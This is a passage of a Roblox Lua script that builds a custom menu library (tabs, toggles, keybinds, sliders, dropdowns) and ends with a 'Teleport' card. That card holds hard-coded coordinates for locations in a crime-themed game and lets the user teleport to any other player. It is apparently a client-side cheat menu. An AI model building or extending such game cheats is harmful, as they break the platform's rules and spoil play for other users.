    ppad.PaddingTop = UDim.new(0, 2)
    ppad.PaddingLeft = UDim.new(0, 2)
    ppad.PaddingRight = UDim.new(0, 2)
    ppad.PaddingBottom = UDim.new(0, 2)
    ppad.Parent = page

    local function updateCanvas()
        local maxH = math.max(leftLay.AbsoluteContentSize.Y, rightLay.AbsoluteContentSize.Y)
        page.CanvasSize = UDim2.new(0, 0, 0, maxH + 15)
    end
    leftLay:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvas)
    rightLay:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvas)

    local btn = Instance.new("TextButton")
    btn.Name = name .. "Btn"
    btn.Size = UDim2.new(1, 0, 0, 46)
    btn.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
    btn.BackgroundTransparency = 1
    btn.Text = ""
    btn.AutoButtonColor = false
    btn.Parent = tcon

    local bcrn = Instance.new("UICorner")
    bcrn.CornerRadius = UDim.new(0, 4)
    bcrn.Parent = btn

    local bstroke = Instance.new("UIStroke")
    bstroke.Color = Color3.fromRGB(45, 45, 45)
    bstroke.Thickness = 1
    bstroke.Transparency = 1
    bstroke.Parent = btn

    local lbl1 = Instance.new("TextLabel")
    lbl1.Size = UDim2.new(1, -30, 0, 20)
    lbl1.Position = UDim2.new(0, 16, 0, 6)
    lbl1.BackgroundTransparency = 1
    lbl1.Text = name
    lbl1.TextColor3 = Color3.fromRGB(140, 140, 140)
    lbl1.Font = Enum.Font.SourceSansBold
    lbl1.TextSize = 14
    lbl1.TextXAlignment = Enum.TextXAlignment.Left
    lbl1.Parent = btn

    local lbl2 = Instance.new("TextLabel")
    lbl2.Size = UDim2.new(1, -30, 0, 14)
    lbl2.Position = UDim2.new(0, 16, 0, 24)
    lbl2.BackgroundTransparency = 1
    lbl2.Text = sub or ""
    lbl2.TextColor3 = Color3.fromRGB(90, 90, 90)
    lbl2.Font = Enum.Font.SourceSans
    lbl2.TextSize = 11
    lbl2.TextXAlignment = Enum.TextXAlignment.Left
    lbl2.Parent = btn

    local ind = Instance.new("Frame")
    ind.Name = "Ind"
    ind.Size = UDim2.new(0, 3, 0, 22)
    ind.Position = UDim2.new(1, -3, 0.5, -11)
    ind.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ind.BorderSizePixel = 0
    ind.Visible = false
    ind.Parent = btn

    local function open()
        if actv == name then return end
        if ColorPickerModal then ColorPickerModal.Visible = false end
        if actv and tabs[actv] then
            tabs[actv].page.Visible = false
            tabs[actv].ind.Visible = false
            tws:Create(tabs[actv].btn, TweenInfo.new(0.15), { BackgroundTransparency = 1 }):Play()
            tws:Create(tabs[actv].bstroke, TweenInfo.new(0.15), { Transparency = 1 }):Play()
            tws:Create(tabs[actv].lbl1, TweenInfo.new(0.15), { TextColor3 = Color3.fromRGB(140, 140, 140) }):Play()
        end
        actv = name
        page.Visible = true
        ind.Visible = true
        tws:Create(btn, TweenInfo.new(0.15), { BackgroundTransparency = 0.4 }):Play()
        tws:Create(bstroke, TweenInfo.new(0.15), { Transparency = 0 }):Play()
        tws:Create(lbl1, TweenInfo.new(0.15), { TextColor3 = Color3.fromRGB(255, 255, 255) }):Play()
    end

    btn.MouseEnter:Connect(function()
        if actv ~= name then
            tws:Create(lbl1, TweenInfo.new(0.12), { TextColor3 = Color3.fromRGB(200, 200, 200) }):Play()
        end
    end)

    btn.MouseLeave:Connect(function()
        if actv ~= name then
            tws:Create(lbl1, TweenInfo.new(0.12), { TextColor3 = Color3.fromRGB(140, 140, 140) }):Play()
        end
    end)

    btn.MouseButton1Click:Connect(open)

    tabs[name] = {
        page = page,
        btn = btn,
        lbl1 = lbl1,
        bstroke = bstroke,
        ind = ind,
        open = open
    }

    table.insert(ThemeUpdateCallbacks, function(color, font)
        lbl1.Font = font
        lbl2.Font = font
    end)

    tcon.CanvasSize = UDim2.new(0, 0, 0, tlay.AbsoluteContentSize.Y + 10)
    return page
end

local function CreateCard(page, text)
    local targetCol = page
    local leftCol = page:FindFirstChild("LeftCol")
    local rightCol = page:FindFirstChild("RightCol")

    if leftCol and rightCol then
        if #rightCol:GetChildren() < #leftCol:GetChildren() then
            targetCol = rightCol
        else
            targetCol = leftCol
        end
    end

    local card = Instance.new("Frame")
    card.Name = text .. "Card"
    card.Size = UDim2.new(1, 0, 0, 0)
    card.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    card.BackgroundTransparency = 0.2
    card.BorderSizePixel = 0
    card.AutomaticSize = Enum.AutomaticSize.Y
    card.LayoutOrder = #targetCol:GetChildren()

    local ccrd = Instance.new("UICorner")
    ccrd.CornerRadius = UDim.new(0, 4)
    ccrd.Parent = card

    local cstr = Instance.new("UIStroke")
    cstr.Color = Color3.fromRGB(45, 45, 45)
    cstr.Thickness = 1
    cstr.Parent = card

    local cttl = Instance.new("TextLabel")
    cttl.Name = "CTtl"
    cttl.Size = UDim2.new(1, 0, 0, 25)
    cttl.Position = UDim2.new(0, 0, 0, 6)
    cttl.BackgroundTransparency = 1
    cttl.Text = text
    cttl.TextColor3 = Color3.fromRGB(255, 255, 255)
    cttl.TextSize = 13
    cttl.Font = Enum.Font.SourceSansBold
    cttl.TextXAlignment = Enum.TextXAlignment.Center
    cttl.Parent = card

    local bbox = Instance.new("Frame")
    bbox.Name = "BBox"
    bbox.Size = UDim2.new(1, -16, 0, 0)
    bbox.Position = UDim2.new(0, 8, 0, 32)
    bbox.BackgroundTransparency = 1
    bbox.BorderSizePixel = 0
    bbox.AutomaticSize = Enum.AutomaticSize.Y
    bbox.Parent = card

    local blay = Instance.new("UIListLayout")
    blay.Padding = UDim.new(0, 6)
    blay.SortOrder = Enum.SortOrder.LayoutOrder
    blay.Parent = bbox

    local bpad = Instance.new("UIPadding")
    bpad.PaddingBottom = UDim.new(0, 10)
    bpad.Parent = bbox

    table.insert(ThemeUpdateCallbacks, function(color, font)
        cttl.Font = font
    end)

    card.Parent = targetCol
    return bbox
end

local function CreateCardButton(parent, text, callback)
    local bttn = Instance.new("TextButton")
    bttn.Size = UDim2.new(1, 0, 0, 28)
    bttn.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
    bttn.BackgroundTransparency = 0.1
    bttn.Text = text
    bttn.TextColor3 = Color3.fromRGB(185, 185, 185)
    bttn.Font = Enum.Font.SourceSans
    bttn.TextSize = 13
    bttn.AutoButtonColor = false

    local bcn = Instance.new("UICorner")
    bcn.CornerRadius = UDim.new(0, 4)
    bcn.Parent = bttn

    local bst = Instance.new("UIStroke")
    bst.Color = Color3.fromRGB(40, 40, 40)
    bst.Thickness = 1
    bst.Parent = bttn

    bttn.MouseEnter:Connect(function()
        tws:Create(bttn, TweenInfo.new(0.12),
            { BackgroundColor3 = Color3.fromRGB(30, 30, 30), TextColor3 = Color3.fromRGB(255, 255, 255) }):Play()
    end)

    bttn.MouseLeave:Connect(function()
        tws:Create(bttn, TweenInfo.new(0.12),
            { BackgroundColor3 = Color3.fromRGB(26, 26, 26), TextColor3 = Color3.fromRGB(185, 185, 185) }):Play()
    end)

    bttn.MouseButton1Click:Connect(function()
        Notify("Action", text .. " activated.", 2)
        if callback then callback() end
    end)

    table.insert(ThemeUpdateCallbacks, function(color, font)
        bttn.Font = font
    end)

    bttn.Parent = parent
    return bttn
end

local ActiveToggles = {}

local function CreateToggle(parent, text, defaultVal, saveKey, callback, colorPickers)
    local togFr = Instance.new("Frame")
    togFr.Size = UDim2.new(1, 0, 0, 32)
    togFr.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
    togFr.BackgroundTransparency = 0.1
    togFr.BorderSizePixel = 0
    togFr.Parent = parent

    local tcn = Instance.new("UICorner")
    tcn.CornerRadius = UDim.new(0, 4)
    tcn.Parent = togFr

    local tst = Instance.new("UIStroke")
    tst.Color = Color3.fromRGB(40, 40, 40)
    tst.Thickness = 1
    tst.Parent = togFr

    local tlbl = Instance.new("TextLabel")
    tlbl.Size = UDim2.new(1, isMobile and -50 or -90, 1, 0)
    tlbl.Position = UDim2.new(0, 10, 0, 0)
    tlbl.BackgroundTransparency = 1
    tlbl.Text = text
    tlbl.TextColor3 = Color3.fromRGB(210, 210, 210)
    tlbl.Font = Enum.Font.SourceSansBold
    tlbl.TextSize = 13
    tlbl.TextXAlignment = Enum.TextXAlignment.Left
    tlbl.TextTruncate = Enum.TextTruncate.AtEnd
    tlbl.Parent = togFr

    local keybtn = Instance.new("TextButton")
    keybtn.Size = UDim2.new(0, 24, 0, 20)
    keybtn.Position = UDim2.new(1, -68, 0.5, -10)
    keybtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    keybtn.Text = "-"
    keybtn.TextColor3 = Color3.fromRGB(150, 150, 150)
    keybtn.Font = Enum.Font.SourceSans
    keybtn.TextSize = 12
    keybtn.Visible = not isMobile
    keybtn.Parent = togFr

    local keycn = Instance.new("UICorner")
    keycn.CornerRadius = UDim.new(0, 4)
    keycn.Parent = keybtn

    local keyst = Instance.new("UIStroke")
    keyst.Color = Color3.fromRGB(45, 45, 45)
    keyst.Parent = keybtn

    local switchBg = Instance.new("TextButton")
    switchBg.Size = UDim2.new(0, 32, 0, 16)
    switchBg.Position = UDim2.new(1, -38, 0.5, -8)
    switchBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    switchBg.Text = ""
    switchBg.AutoButtonColor = false
    switchBg.Parent = togFr

    local swcn = Instance.new("UICorner")
    swcn.CornerRadius = UDim.new(1, 0)
    swcn.Parent = switchBg

    local swcir = Instance.new("Frame")
    swcir.Size = UDim2.new(0, 12, 0, 12)
    swcir.Position = UDim2.new(0, 2, 0.5, -6)
    swcir.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    swcir.Parent = switchBg

    local swccn = Instance.new("UICorner")
    swccn.CornerRadius = UDim.new(1, 0)
    swccn.Parent = swcir

    local toggled = defaultVal or false
    if saveKey ~= nil and type(saveKey) == "string" then
        if Config.Toggles[saveKey] ~= nil then
            toggled = Config.Toggles[saveKey]
        else
            Config.Toggles[saveKey] = toggled
        end
    end

    local currentKeybind = nil
    if saveKey ~= nil and type(saveKey) == "string" then
        Config.Keybinds = Config.Keybinds or {}
        if Config.Keybinds[saveKey] ~= nil then
            local success, enumKey = pcall(function() return Enum.KeyCode[Config.Keybinds[saveKey]] end)
            if success and enumKey then
                currentKeybind = enumKey
                keybtn.Text = enumKey.Name
            end
        end
    end

    if toggled then
        swcir.Position = UDim2.new(1, -14, 0.5, -6)
        switchBg.BackgroundColor3 = SharedThemeColor
    else
        swcir.Position = UDim2.new(0, 2, 0.5, -6)
        switchBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    end

    local function doToggle(forceFalse)
        if forceFalse then
            if not toggled then return end
            toggled = false
        else
            toggled = not toggled
        end
        if saveKey ~= nil and type(saveKey) == "string" then
            Config.Toggles[saveKey] = toggled
            SaveConfig()
        end
        if toggled then
            tws:Create(swcir, TweenInfo.new(0.2), { Position = UDim2.new(1, -14, 0.5, -6) }):Play()
            tws:Create(switchBg, TweenInfo.new(0.2), { BackgroundColor3 = SharedThemeColor }):Play()
            if not forceFalse then Notify("Toggle Enabled", text .. " has been enabled.", 2) end
        else
            tws:Create(swcir, TweenInfo.new(0.2), { Position = UDim2.new(0, 2, 0.5, -6) }):Play()
            tws:Create(switchBg, TweenInfo.new(0.2), { BackgroundColor3 = Color3.fromRGB(40, 40, 40) }):Play()
            if not forceFalse then Notify("Toggle Disabled", text .. " has been disabled.", 2) end
        end
        if callback then pcall(callback, toggled) end
    end
    table.insert(ActiveToggles, doToggle)

    switchBg.MouseButton1Click:Connect(function() doToggle() end)

    local waitingForKey = false
    keybtn.MouseButton1Click:Connect(function()
        waitingForKey = true
        keybtn.Text = "..."
    end)

    uis.InputBegan:Connect(function(input, gpe)
        if waitingForKey then
            if input.UserInputType == Enum.UserInputType.Keyboard then
                local key = input.KeyCode
                if key == Enum.KeyCode.Escape or key == Enum.KeyCode.Backspace then
                    currentKeybind = nil
                    keybtn.Text = "-"
                else
                    currentKeybind = key
                    keybtn.Text = key.Name
                end
                waitingForKey = false
                if saveKey ~= nil and type(saveKey) == "string" then
                    Config.Keybinds = Config.Keybinds or {}
                    Config.Keybinds[saveKey] = currentKeybind and currentKeybind.Name or nil
                    SaveConfig()
                end
            end
        elseif not gpe and currentKeybind and input.KeyCode == currentKeybind then
            doToggle()
        end
    end)

    table.insert(ThemeUpdateCallbacks, function(color, font)
        tlbl.Font = font
        keybtn.Font = font
        if toggled then
            switchBg.BackgroundColor3 = color
        end
    end)

    if colorPickers and #colorPickers > 0 then
        keybtn.Visible = false
        local offset = -68
        for i, cObj in ipairs(colorPickers) do
            local ColBtn = Instance.new("TextButton")
            ColBtn.Size = UDim2.new(0, 18, 0, 18)
            ColBtn.Position = UDim2.new(1, offset, 0.5, -9)
            ColBtn.BackgroundColor3 = cObj.get() or Color3.new(1, 1, 1)
            ColBtn.Text = ""
            ColBtn.ZIndex = 6
            ColBtn.Parent = togFr

            local cC = Instance.new("UICorner")
            cC.CornerRadius = UDim.new(0, 4)
            cC.Parent = ColBtn

            local cS = Instance.new("UIStroke")
            cS.Color = Color3.fromRGB(45, 45, 45)
            cS.Thickness = 1
            cS.Parent = ColBtn

            ColBtn.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    OpenPicker(function(nc)
                        ColBtn.BackgroundColor3 = nc
                        if cObj.set then cObj.set(nc) end
                    end)
                end
            end)

            offset = offset - 24
        end
    end

    return { Frame = togFr, Toggle = switchBg, Keybind = keybtn }
end

local function CreateSlider(parent, text, min, max, defaultVal, saveKey, callback)
    local default = defaultVal or min
    if saveKey ~= nil and type(saveKey) == "string" then
        if Config.Sliders[saveKey] ~= nil then
            default = Config.Sliders[saveKey]
        else
            Config.Sliders[saveKey] = default
        end
    end
    local sldFr = Instance.new("Frame")
    sldFr.Size = UDim2.new(1, 0, 0, 38)
    sldFr.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
    sldFr.BackgroundTransparency = 0.1
    sldFr.BorderSizePixel = 0
    sldFr.Parent = parent

    local scn = Instance.new("UICorner")
    scn.CornerRadius = UDim.new(0, 4)
    scn.Parent = sldFr

    local sst = Instance.new("UIStroke")
    sst.Color = Color3.fromRGB(40, 40, 40)
    sst.Thickness = 1
    sst.Parent = sldFr

    local tlbl = Instance.new("TextLabel")
    tlbl.Size = UDim2.new(1, -50, 0, 16)
    tlbl.Position = UDim2.new(0, 10, 0, 4)
    tlbl.BackgroundTransparency = 1
    tlbl.Text = text
    tlbl.TextColor3 = Color3.fromRGB(210, 210, 210)
    tlbl.Font = Enum.Font.SourceSansBold
    tlbl.TextSize = 13
    tlbl.TextXAlignment = Enum.TextXAlignment.Left
    tlbl.TextTruncate = Enum.TextTruncate.AtEnd
    tlbl.Parent = sldFr

    local vlbl = Instance.new("TextLabel")
    vlbl.Size = UDim2.new(0, 30, 0, 16)
    vlbl.Position = UDim2.new(1, -38, 0, 4)
    vlbl.BackgroundTransparency = 1
    vlbl.Text = tostring(default)
    vlbl.TextColor3 = Color3.fromRGB(255, 120, 120)
    vlbl.Font = Enum.Font.SourceSansBold
    vlbl.TextSize = 12
    vlbl.TextXAlignment = Enum.TextXAlignment.Right
    vlbl.Parent = sldFr

    local sbg = Instance.new("TextButton")
    sbg.Size = UDim2.new(1, -20, 0, 4)
    sbg.Position = UDim2.new(0, 10, 0, 26)
    sbg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    sbg.Text = ""
    sbg.AutoButtonColor = false
    sbg.Parent = sldFr

    local sbgcn = Instance.new("UICorner")
    sbgcn.CornerRadius = UDim.new(1, 0)
    sbgcn.Parent = sbg

    local sfill = Instance.new("Frame")

    local pct = math.clamp((default - min) / (max - min), 0, 1)
    sfill.Size = UDim2.new(pct, 0, 1, 0)
    sfill.BackgroundColor3 = SharedThemeColor
    sfill.Parent = sbg

    local sfcn = Instance.new("UICorner")
    sfcn.CornerRadius = UDim.new(1, 0)
    sfcn.Parent = sfill

    local scir = Instance.new("Frame")
    scir.Size = UDim2.new(0, 10, 0, 10)
    scir.Position = UDim2.new(1, -5, 0.5, -5)
    scir.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    scir.Parent = sfill

    local sccn = Instance.new("UICorner")
    sccn.CornerRadius = UDim.new(1, 0)
    sccn.Parent = scir

    local dragging = false
    sbg.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
        end
    end)

    uis.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            if dragging then
                dragging = false
                if saveKey ~= nil and type(saveKey) == "string" then
                    SaveConfig()
                end
            end
        end
    end)

    uis.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local mousePos = uis:GetMouseLocation().X
            local rel = math.clamp((mousePos - sbg.AbsolutePosition.X) / sbg.AbsoluteSize.X, 0, 1)
            sfill.Size = UDim2.new(rel, 0, 1, 0)
            local val = math.floor(min + ((max - min) * rel))
            vlbl.Text = tostring(val)
            if saveKey ~= nil and type(saveKey) == "string" then
                Config.Sliders[saveKey] = val
            end
            if callback then callback(val) end
        end
    end)

    table.insert(ThemeUpdateCallbacks, function(color, font)
        tlbl.Font = font
        vlbl.Font = font
        vlbl.TextColor3 = color
        sfill.BackgroundColor3 = color
    end)

    return { Frame = sldFr, Value = vlbl, Fill = sfill }
end

local function CreateInput(parent, text, saveKey, defaultVal, callback)
    local inpFr = Instance.new("Frame")
    inpFr.Size = UDim2.new(1, 0, 0, 36)
    inpFr.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    inpFr.BackgroundTransparency = 0.1
    inpFr.BorderSizePixel = 0
    inpFr.ClipsDescendants = true
    inpFr.Parent = parent

    local icn = Instance.new("UICorner")
    icn.CornerRadius = UDim.new(0, 4)
    icn.Parent = inpFr

    local ist = Instance.new("UIStroke")
    ist.Color = Color3.fromRGB(40, 40, 40)
    ist.Thickness = 1
    ist.Parent = inpFr

    local tlbl = Instance.new("TextLabel")
    tlbl.Size = UDim2.new(1, -20, 0, 14)
    tlbl.Position = UDim2.new(0, 10, 0, 4)
    tlbl.BackgroundTransparency = 1
    tlbl.Text = text
    tlbl.TextColor3 = Color3.fromRGB(210, 210, 210)
    tlbl.Font = Enum.Font.SourceSansBold
    tlbl.TextSize = 12
    tlbl.TextXAlignment = Enum.TextXAlignment.Left
    tlbl.TextTruncate = Enum.TextTruncate.AtEnd
    tlbl.Parent = inpFr

    local box = Instance.new("TextBox")
    box.Size = UDim2.new(1, -20, 0, 14)
    box.Position = UDim2.new(0, 10, 0, 18)
    box.BackgroundTransparency = 1
    box.Text = Config[saveKey] or defaultVal or ""
    box.TextColor3 = Color3.fromRGB(150, 150, 150)
    box.Font = Enum.Font.SourceSans
    box.TextSize = 12
    box.TextXAlignment = Enum.TextXAlignment.Left
    box.ClearTextOnFocus = true
    box.Parent = inpFr

    box.FocusLost:Connect(function()
        Config[saveKey] = box.Text
        SaveConfig()
        if callback then callback(box.Text) end
    end)

    table.insert(ThemeUpdateCallbacks, function(color, font)
        tlbl.Font = font
        box.Font = font
    end)

    return { Frame = inpFr, Box = box }
end

local AllDropdowns = {}

local function CreateDropdown(parent, text, options, saveKey, defaultIdx, callback, textOverride)
    local dropFr = Instance.new("Frame")
    dropFr.Size = UDim2.new(1, 0, 0, 36)
    dropFr.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    dropFr.BackgroundTransparency = 0.1
    dropFr.BorderSizePixel = 0
    dropFr.Parent = parent

    local dcn = Instance.new("UICorner")
    dcn.CornerRadius = UDim.new(0, 4)
    dcn.Parent = dropFr

    local dst = Instance.new("UIStroke")
    dst.Color = Color3.fromRGB(40, 40, 40)
    dst.Thickness = 1
    dst.Parent = dropFr

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text = ""
    btn.Parent = dropFr

    local tlbl = Instance.new("TextLabel")
    tlbl.Size = UDim2.new(1, -30, 1, 0)
    tlbl.Position = UDim2.new(0, 10, 0, 0)
    tlbl.BackgroundTransparency = 1
    local currentIdx = defaultIdx
    if saveKey ~= nil and Config[saveKey] ~= nil then
        currentIdx = Config[saveKey]
    end

    if textOverride then
        tlbl.Text = textOverride
    else
        tlbl.Text = text .. ": " .. (options[currentIdx] and options[currentIdx].Name or "")
    end

    tlbl.TextColor3 = Color3.fromRGB(210, 210, 210)
    tlbl.Font = SharedThemeFont
    tlbl.TextSize = 12
    tlbl.TextXAlignment = Enum.TextXAlignment.Left
    tlbl.TextTruncate = Enum.TextTruncate.AtEnd
    tlbl.Parent = btn

    local arrow = Instance.new("TextLabel")
    arrow.Size = UDim2.new(0, 20, 1, 0)
    arrow.Position = UDim2.new(1, -25, 0, 0)
    arrow.BackgroundTransparency = 1
    arrow.Text = "v"
    arrow.TextColor3 = Color3.fromRGB(150, 150, 150)
    arrow.Font = Enum.Font.SourceSansBold
    arrow.TextSize = 14
    arrow.Parent = btn

    local listFr = Instance.new("ScrollingFrame")
    listFr.Size = UDim2.new(1, 0, 0, 0)
    listFr.Position = UDim2.new(0, 0, 1, 2)
    listFr.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    listFr.BorderSizePixel = 0
    listFr.ScrollBarThickness = 2
    listFr.ZIndex = 10
    listFr.Visible = false
    listFr.AutomaticCanvasSize = Enum.AutomaticSize.Y
    listFr.Parent = dropFr

    local lcn = Instance.new("UICorner")
    lcn.CornerRadius = UDim.new(0, 4)
    lcn.Parent = listFr

    local lst = Instance.new("UIStroke")
    lst.Color = Color3.fromRGB(45, 45, 45)
    lst.Thickness = 1
    lst.Parent = listFr

    local llay = Instance.new("UIListLayout")
    llay.SortOrder = Enum.SortOrder.LayoutOrder
    llay.Parent = listFr

    local open = false
    local totalH = #options * 26

    local api = { Frame = dropFr, Parent = parent }
    table.insert(AllDropdowns, api)

    function api.IsOpen() return open end

    function api.Close()
        if open then
            open = false
            arrow.Text = "v"
            local tw = tws:Create(listFr, TweenInfo.new(0.2), { Size = UDim2.new(1, 0, 0, 0) })
            tw:Play()
            tw.Completed:Connect(function()
                if not open then
                    listFr.Visible = false
                    dropFr.ZIndex = 1
                    local anyOpen = false
                    for _, d in ipairs(AllDropdowns) do
                        if d.Parent == parent and d.IsOpen() then
                            anyOpen = true
                        end
                    end
                    if not anyOpen then
                        if parent then parent.ZIndex = 1 end
                        if parent and parent.Parent then parent.Parent.ZIndex = 1 end
                    end
                end
            end)
        end
    end

    btn.MouseButton1Click:Connect(function()
        if not open then
            for _, d in ipairs(AllDropdowns) do
                if d ~= api and d.IsOpen() then
                    d.Close()
                end
            end
            open = true
            dropFr.ZIndex = 10
            if parent then parent.ZIndex = 10 end
            if parent and parent.Parent then parent.Parent.ZIndex = 10 end
            listFr.Visible = true
            arrow.Text = "^"
            tws:Create(listFr, TweenInfo.new(0.2), { Size = UDim2.new(1, 0, 0, math.min(totalH, 120)) }):Play()
        else
            api.Close()
        end
    end)

    local optBtns = {}

    function api.Refresh(newOptions, newTextOverride)
        for _, ob in ipairs(optBtns) do ob:Destroy() end
        optBtns = {}
        options = newOptions
        totalH = #options * 26

        if newTextOverride then
            tlbl.Text = newTextOverride
        elseif saveKey == nil then
            tlbl.Text = text .. ": " .. (options[1] and options[1].Name or "")
        end

        for i, opt in ipairs(options) do
            local obtn = Instance.new("TextButton")
            obtn.Size = UDim2.new(1, 0, 0, 26)
            obtn.BackgroundTransparency = 1
            obtn.Text = "  " .. opt.Name

            if string.find(opt.Name, "^%-%-%[") then
                obtn.TextColor3 = SharedThemeColor
                obtn.Font = Enum.Font.GothamBold
                obtn.TextSize = 13
                obtn.TextXAlignment = Enum.TextXAlignment.Center
                obtn.AutoButtonColor = false
            else
                obtn.TextColor3 = Color3.fromRGB(180, 180, 180)
                obtn.Font = SharedThemeFont
                obtn.TextSize = 12
                obtn.TextXAlignment = Enum.TextXAlignment.Left

                obtn.MouseEnter:Connect(function()
                    tws:Create(obtn, TweenInfo.new(0.15), {
                        TextColor3 = Color3.fromRGB(255, 255, 255)
                    }):Play()
                end)

                obtn.MouseLeave:Connect(function()
                    tws:Create(obtn, TweenInfo.new(0.15), {
                        TextColor3 = Color3.fromRGB(180, 180, 180)
                    }):Play()
                end)

                obtn.MouseButton1Click:Connect(function()
                    tlbl.Text = text .. ": " .. opt.Name
                    api.Close()

                    if saveKey ~= nil then
                        Config[saveKey] = i
                        SaveConfig()
                    end
                    if callback then callback(opt.Value) end
                end)
            end

            obtn.ZIndex = 11
            obtn.Parent = listFr
            table.insert(optBtns, obtn)
        end
    end

    api.Refresh(options, textOverride)

    table.insert(ThemeUpdateCallbacks, function(color, font)
        tlbl.Font = font
        arrow.Font = font
        for _, ob in ipairs(optBtns) do
            if ob.AutoButtonColor == false then
                ob.TextColor3 = color
            else
                ob.Font = font
            end
        end
    end)

    return api
end


local pma = CreateTab("Main", "Main Features")

local ctp = CreateCard(pma, "Teleport")

local LOCS = {
    ["🔫 Gun Store 1"] = Vector3.new(-35521.61, 255.27, 197.68),
    ["🔫 Gun Store 2"] = Vector3.new(-55.53, 79.67, -140.54),
    ["🔫 Gun Store 3"] = Vector3.new(-723.45, 63.97, -256.19),
    ["🧊 Ice Box"] = Vector3.new(206.24, 90.44, 143.81),
    ["👕 Clothes Store"] = Vector3.new(112.59, 90.44, -38.02),
    ["✂️ Barber"] = Vector3.new(60.78, 90.36, -49.71),
    ["🛍️ Frank Shop"] = Vector3.new(4.82, 90.69, -61.26),
    ["🛍️ Travis Shop"] = Vector3.new(-63.01, 90.51, -51.03),
    ["👮 Police Station"] = Vector3.new(422.40, 92.33, -83.51),
    ["🔫 Pawn Shop"] = Vector3.new(200.49, 91.04, -34.77),
    ["⛽ Gas Station 1"] = Vector3.new(-31.96, 90.34, 282.72),
    ["⛽ Gas Station 2"] = Vector3.new(-542.33, 49.77, -360.66),
    ["🚗 Car Customization"] = Vector3.new(-163.45, 89.91, -151.01),
    ["🏬 Supply Store"] = Vector3.new(-449.18, 51.17, 397.83),
    ["💣 Black Market"] = Vector3.new(-797.63, 44.64, 563.28),
    ["🧧 HitMan"] = Vector3.new(-1338.14, 49.78, 433.75),
    ["🗑️ Sell Trash"] = Vector3.new(-851.57, 50.15, 428.10),
    ["🏬 Apartments"] = Vector3.new(747.67, 89.74, -376.21),
    ["💰 Bank Supply"] = Vector3.new(998.59, 231.32, -498.92),
    ["🐶 Pet Shop"] = Vector3.new(1254.51, 135.42, -557.29),
    ["🍔 McDonalds"] = Vector3.new(963.17, 129.91, 87.37),
    ["🍟 Sell Fries"] = Vector3.new(815.84, 90.67, 574.74),
    ["🏨 Hotel 1"] = Vector3.new(984.54, 272.14, 448.79),
    ["🏨 Hotel 2"] = Vector3.new(163.99, 160.88, 439.33),
    ["👟 Shoes Store"] = Vector3.new(-278.27, 89.74, 504.62),
    ["🖨️ Sell Printers Pdt"] = Vector3.new(91.03, 132.07, 531.69),
    ["🛍️ Zay"] = Vector3.new(-603.45, 50.73, 584.89),
    ["🧽 Laundromat"] = Vector3.new(-712.91, 50.10, 290.47),
    ["🚗 Car Dealer"] = Vector3.new(433.44, 89.62, -376.54),
    ["🖋️ Tattoo Shop"] = Vector3.new(983.79, 131.01, -99.94),
    ["🌃 Club"] = Vector3.new(-440.48, 50.59, 179.16),
    ["🌱 Sell Weed"] = Vector3.new(754.89, 228.03, -125.40),
    ["🥖 Chop Shop"] = Vector3.new(237.53, 100.73, 2638.97),
    ["🌱 Grow Job"] = Vector3.new(1532.60, 89.79, 2672.12),
    ["💰 Bank"] = Vector3.new(192.66, 89.62, -175.13),
    ["🎙️ Radar"] = Vector3.new(-35777.34, 17.82, -269.59),
    ["🎒 Backpack"] = Vector3.new(-184.99, 89.89, 276.40),
    ["🛍️ Neo Shop"] = Vector3.new(653.68, 89.84, 243.68),
    ["🔫 Gamepass Guns"] = Vector3.new(-166.85, 105.43, -198.16),
    ["📦 Packaging"] = Vector3.new(-2369.71, 50.57, 653.50),
    ["🥤 Juice Job"] = Vector3.new(-2276.70, 49.72, 1338.95)
}

local sortedLocs = {}
for name, _ in pairs(LOCS) do table.insert(sortedLocs, name) end
table.sort(sortedLocs)

local locOpts = {}
for _, name in ipairs(sortedLocs) do table.insert(locOpts, { Name = name, Value = LOCS[name] }) end

local locDrop
locDrop = CreateDropdown(ctp, "Location", locOpts, nil, 1, function(val)
    if val then
        SafeTP(val)
        local locName = "Unknown Location"
        for k, v in pairs(LOCS) do
            if v == val then
                locName = k; break
            end
        end
        Notify("Teleport", "Teleported to " .. locName, 2)
        task.spawn(function()
            task.wait(0.5)
            locDrop.Refresh(locOpts, "Select Location...")
        end)
    end
end, "Select Location...")

local refreshPlayers

local plrDrop
plrDrop = CreateDropdown(ctp, "Player", {}, nil, 1, function(val)
    if val and val.Character and val.Character:FindFirstChild("HumanoidRootPart") then
        SafeTP(val.Character.HumanoidRootPart.Position)
        Notify("Teleport", "Teleported to Player: " .. val.Name, 2)
        task.spawn(function()
            task.wait(0.5)
            refreshPlayers()
        end)
    end
end, "Select Player...")

refreshPlayers = function()
    local popts = {}
    for _, p in ipairs(pls:GetPlayers()) do
        if p ~= LPLR then
            table.insert(popts, { Name = p.Name, Value = p })
        end
    end
    plrDrop.Refresh(popts, "Select Player...")
end

pls.PlayerAdded:Connect(refreshPlayers)
pls.PlayerRemoving:Connect(refreshPlayers)
task.spawn(function()
    while task.wait(5) do
        refreshPlayers()
    end
end)
refreshPlayers()

